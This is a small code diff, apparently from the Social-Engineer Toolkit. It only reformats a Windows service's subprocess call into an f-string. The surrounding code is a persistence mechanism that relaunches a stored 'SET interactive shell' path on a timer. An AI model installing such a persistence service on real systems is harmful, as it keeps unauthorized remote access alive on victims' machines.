@@ -73,8 +73,13 @@ class aservice(win32serviceutil.ServiceFramework):
                 # written when persistence is called
                 set_path = line.rstrip()
             # specify filename to execute the SET interactive shell
-            subprocess.Popen('%s' % (set_path), shell=True, stdout=subprocess.PIPE,
-                             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            subprocess.Popen(
+                f'{set_path}',
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+            )
             # sleep 30 mins
             time.sleep(1800)
             self.ReportServiceStatus(win32service.SERVICE_STOPPED)
